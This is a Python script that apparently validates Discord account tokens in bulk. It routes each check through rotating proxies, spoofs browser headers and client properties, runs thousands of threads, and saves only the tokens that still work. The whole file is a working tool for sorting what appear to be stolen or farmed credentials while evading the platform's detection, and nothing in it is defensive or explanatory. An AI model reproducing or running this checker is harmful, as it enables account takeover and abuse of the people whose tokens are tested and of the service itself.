import requests, itertools, sys, os, datetime, base64, concurrent.futures

class Logging:
    def time():
        return datetime.datetime.now().strftime('%M:%S.%f')[:-3]

    def info(input: str):
        print('\t\x1b[1m\x1b[38;5;33m[\x1b[0m\x1b[1m%s\x1b[38;5;33m]\x1b[0m\x1b[1m %s\x1b[0m' % (Logging.time(), input))

    def error(input: str):
        print('\t\x1b[1m\x1b[38;5;9m[\x1b[0m\x1b[1m%s\x1b[38;5;9m]\x1b[0m\x1b[1m %s\x1b[0m' % (Logging.time(), input))

class Main:
    def __init__(self):
        self.tokens = []
        self.proxies = []
        try:
            with open('tokens.txt', 'r', encoding = 'UTF-8') as file:
                if os.stat('tokens.txt').st_size != 0:
                    for _ in file.read().splitlines():
                        self.tokens.append(_)
                else:
                    Logging.error('File tokens.txt is empty.')
                    self._exit()
            with open('proxies.txt', 'r', encoding = 'UTF-8') as file:
                if os.stat('proxies.txt').st_size != 0:
                    for _ in file.read().splitlines():
                        self.proxies.append(_)
                else:
                    Logging.error('File proxies.txt is empty.')
                    self._exit()
        except:
            open('tokens.txt', 'w+').close()
            open('proxies.txt', 'w+').close()
        self.token_pool = itertools.cycle(self.tokens)
        self.proxy_pool = itertools.cycle(self.proxies)
        if sys.platform == 'win32':
            self.cls = lambda: os.system('cls')
        else:
            self.cls = lambda: os.system('clear')

    def _exit(self):
        input('\t\x1b[1mPress \x1b[38;5;33mEnter\x1b[0m\x1b[1m to exit.')
        os._exit(0)

    def get_token(self):
        token = next(self.token_pool)
        return token

    def get_proxy(self):
        proxy = next(self.proxy_pool)
        return {
            'http': 'http://%s' % proxy,
            'https': 'http://%s' % proxy
        }

    def get_token_id(self, token):
        try:
            return base64.b64decode(token.split('.')[0].encode()).decode()
        except:
            return '0' * 18

    def get_cookie(self):
        response = requests.Session().get('https://discord.com/app')
        cookie = str(response.cookies)
        return cookie.split('dcfduid=')[1].split(';')[0], cookie.split('sdcfduid=')[1].split(';')[0]

    def create_session(self, token):
        session = requests.Session()
        session.proxies.update(self.get_proxy())
        session.headers.update({
            'authorization': token,
            'accept': '*/*',
            'accept-encoding': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'cookie': '__dcfduid=%s; __sdcfduid=%s; locale=en-US' % self.get_cookie(),
            'origin': 'https://discord.com',
            'referer': 'https://discord.com/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36',
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-US',
            'x-super-properties': 'eyJvcyI6Ik1hYyBPUyBYIiwiYnJvd3NlciI6IkNocm9tZSIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDMuMC41MDYwLjExNCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTAzLjAuNTA2MC4xMTQiLCJvc192ZXJzaW9uIjoiMTAuMTUuNyIsInJlZmVycmVyIjoiIiwicmVmZXJyaW5nX2RvbWFpbiI6IiIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5OTk5LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=='
        })
        return session

    def login(self, token, attempts = 1):
        if attempts == 5:
            return
        try:
            session = self.create_session(token)
            response = session.get('https://discord.com/api/v9/users/@me/library')
            self.total -= 1
            if response.status_code == 200:
                self.valid.append(token)
                Logging.info('Token \x1b[38;5;33m%s\x1b[0m\x1b[1m is \x1b[38;5;33mvalid\x1b[0m\x1b[1m. Valid: \x1b[38;5;33m%s\x1b[0m\x1b[1m | Invalid: \x1b[38;5;33m%s\x1b[0m\x1b[1m | Locked: \x1b[38;5;33m%s\x1b[0m\x1b[1m | Left: \x1b[38;5;33m%s\x1b[0m\x1b[1m' % (self.get_token_id(token), len(self.valid), self.invalid, self.locked, self.total))
            elif response.status_code == 401:
                self.invalid += 1
                Logging.error('Token \x1b[38;5;9m%s\x1b[0m\x1b[1m is \x1b[38;5;9minvalid\x1b[0m\x1b[1m. Valid: \x1b[38;5;9m%s\x1b[0m\x1b[1m | Invalid: \x1b[38;5;9m%s\x1b[0m\x1b[1m | Locked: \x1b[38;5;9m%s\x1b[0m\x1b[1m | Left: \x1b[38;5;9m%s\x1b[0m\x1b[1m' % (self.get_token_id(token), len(self.valid), self.invalid, self.locked, self.total))
            elif response.status_code == 403:
                self.locked += 1
                Logging.error('Token \x1b[38;5;9m%s\x1b[0m\x1b[1m is \x1b[38;5;9mlocked\x1b[0m\x1b[1m. Valid: \x1b[38;5;9m%s\x1b[0m\x1b[1m | Invalid: \x1b[38;5;9m%s\x1b[0m\x1b[1m | Locked: \x1b[38;5;9m%s\x1b[0m\x1b[1m | Left: \x1b[38;5;9m%s\x1b[0m\x1b[1m' % (self.get_token_id(token), len(self.valid), self.invalid, self.locked, self.total))
            else:
                Logging.error('Unrecognized response: \x1b[38;5;9m%s\x1b[0m\x1b[1m.' % response.json())
        except:
            self.login(token, attempts + 1)

    def run(self):
        with concurrent.futures.ThreadPoolExecutor(max_workers = 10000) as executor:
            while True:
                self.cls()
                print('\n\t\x1b[1m\x1b[38;5;33m[\x1b[0m\x1b[1m1\x1b[38;5;33m]\x1b[0m\x1b[1m Remove Bad Tokens')
                option = int(input('\n\tOption\x1b[38;5;33m >\x1b[0m\x1b[1m '))
                print()
                if option == 1:
                    self.valid = []
                    self.invalid = 0
                    self.locked = 0
                    self.total = len(self.tokens)
                    tasks = [executor.submit(self.login, self.get_token()) for _ in range(len(self.tokens))]
                    for _ in tasks:
                        for _ in concurrent.futures.as_completed(tasks):
                            pass
                    if len(self.valid):
                        open('tokens.txt', 'w', encoding = 'UTF-8').close()
                        with open('tokens.txt', 'a', encoding = 'UTF-8') as file:
                            for token in self.valid:
                                file.write('%s\n' % token)
                        print('\n\t\x1b[1mSaved \x1b[38;5;33m%s\x1b[0m\x1b[1m valid tokens.' % len(self.valid))
                        self._exit()
                    else:
                        print('\n\t\x1b[1mNo valid tokens found.')
                        self._exit()

if __name__ == '__main__':
    Main().run()
